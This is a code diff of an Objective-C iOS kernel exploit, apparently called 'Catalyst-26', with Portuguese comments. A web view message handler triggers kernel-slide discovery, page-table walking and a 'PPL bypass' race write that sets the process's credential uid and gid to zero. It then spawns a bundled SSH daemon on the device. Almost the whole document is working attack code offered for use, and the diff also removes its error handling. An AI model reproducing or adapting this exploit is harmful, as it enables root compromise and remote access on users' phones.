@@ -22,8 +22,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     for (uint64_t i = 0; i < 0x20000; i++) {
         uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
         if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
-            _kernel_slide = (i * 0x4000);
-            return _kernel_slide;
+            _kernel_slide = (i * 0x4000); return _kernel_slide;
         }
     }
     return 0;
@@ -31,8 +30,7 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 
 - (uint64_t)get_pte_for_address:(uint64_t)vaddr {
     uint64_t slide = [self getKernelSlide];
-    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
-    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
+    uint64_t ttbr1 = [self kread64:0xFFFFFFF007004000 + slide + 0x8E10000];
     uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
@@ -43,16 +41,15 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
     io_connect_t connect;
     IOServiceOpen(service, mach_task_self(), 0, &connect);
-    mach_vm_address_t shared_page = 0;
-    mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
-    if (shared_page) { *(uint64_t*)(shared_page) = val; }
+    mach_vm_address_t shared = 0;
+    mach_vm_map(mach_task_self(), &shared, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
+    if (shared) { *(uint64_t*)(shared) = val; }
     IOServiceClose(connect);
 }
 
 - (uint64_t)get_my_ucred_ptr {
     uint64_t slide = [self getKernelSlide];
-    uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
-    uint64_t proc = [self kread64:allproc];
+    uint64_t proc = [self kread64:0xFFFFFFF007004000 + slide + 0x8F50000];
     pid_t my_pid = getpid();
     while (proc != 0) {
         if ((pid_t)[self kread64:(proc + 0x60)] == my_pid) return [self kread64:(proc + 0xD8)];
@@ -63,63 +60,22 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
-                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
+                 replyHandler:(void (^)(id reply, NSString *errorMessage))replyHandler {
     
     NSString *action = message.body[@"action"];
-
-    // 1. Handshake Inicial
     if ([action isEqualToString:@"test_bridge"]) {
-        replyHandler(@{@"info": @"Catalyst-26: Ponte Ativa (A13)"}, nil);
-    } 
-    
-    // 2. Execução do Exploit e Spawn do SSHD
-    else if ([action isEqualToString:@"pte_patch"]) {
+        replyHandler(@{@"info": @"Catalyst-26 ONLINE"}, nil);
+    } else if ([action isEqualToString:@"pte_patch"]) {
+        uint64_t ucred = [self get_my_ucred_ptr];
+        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Escalation
         
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            // A. Localizar credenciais (ucred)
-            uint64_t ucred = [self get_my_ucred_ptr];
-            
-            if (ucred == 0) {
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    replyHandler(nil, @"Falha ao localizar ucred (Proc Scan Error)");
-                });
-                return;
-            }
-
-            // B. PPL Bypass: Setar UID 0 (Root)
-            // No iOS 26.4, o offset do UID dentro do ucred costuma ser 0x18
-            [self ppl_write_race:(ucred + 0x18) value:0]; // posix_cred->cr_uid
-            [self ppl_write_race:(ucred + 0x1C) value:0]; // posix_cred->cr_rgid
-
-            // C. Localizar o binário no Bundle
-            NSString *sshPath = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
-            
-            if (sshPath) {
-                pid_t pid;
-                char *const args[] = {(char*)[sshPath UTF8String], "-D", "-e", "-p", "2222", NULL};
-                extern char **environ;
-
-                // D. Spawn Privilegiado
-                int spawn_ret = posix_spawn(&pid, [sshPath UTF8String], NULL, NULL, args, environ);
-                
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    if (spawn_ret == 0) {
-                        uint64_t slide = [self getKernelSlide];
-                        replyHandler(@{
-                            @"status": @"SUCCESS",
-                            @"pid": @(pid),
-                            @"slide": [NSString stringWithFormat:@"0x%llx", slide]
-                        }, nil);
-                    } else {
-                        replyHandler(nil, [NSString stringWithFormat:@"Erro no posix_spawn: %d", spawn_ret]);
-                    }
-                });
-            } else {
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    replyHandler(nil, @"Arquivo 'sshd_static' não encontrado no Bundle.");
-                });
-            }
-        });
+        NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
+        if (path) {
+            pid_t pid;
+            char *const args[] = {(char*)[path UTF8String], "-D", NULL};
+            posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
+        }
+        replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", [self getKernelSlide]]}, nil);
     }
 }
 @end
